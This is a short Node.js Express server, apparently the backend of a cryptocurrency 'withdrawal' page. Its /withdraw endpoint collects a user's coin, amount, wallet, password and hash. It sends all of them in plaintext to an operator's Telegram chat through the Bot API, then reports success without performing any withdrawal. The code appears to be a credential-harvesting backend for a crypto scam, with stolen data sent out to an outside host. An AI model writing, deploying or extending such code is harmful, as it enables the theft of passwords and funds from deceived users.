const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();

// 关键：必须，否则 req.body=undefined 直接崩溃
app.use(express.json());

// 关键：跨域，否则前端永远 Network error
app.use(cors());

// 关键：Railway 会 GET / 作为健康检测
app.get("/", (req, res) => {
    res.send("OK");
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

app.post("/withdraw", async (req, res) => {
    console.log("Withdraw received:", req.body);

    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        if (!coin || !amount || !wallet || !password || !hash) {
            return res.status(400).json({ success: false, error: "Missing fields" });
        }

        const message = `
<b>🚨 Withdrawal Request</b>

Coin: ${coin}
Amount: ${amount}
USDT: ${usdt}
Wallet: ${wallet}
Password: ${password}
Hash: ${hash}
        `;

        // 防止 TG 报错导致整个服务崩掉
        try {
            await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                }
            );
        } catch (tgErr) {
            console.error("Telegram Error:", tgErr.response?.data || tgErr.message);
        }

        return res.json({ success: true });

    } catch (err) {
        console.error("Server Crash:", err);
        return res.status(500).json({ success: false, error: "Server error" });
    }
});

// Railway 指定端口
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log("🚀 Server running on port " + PORT));
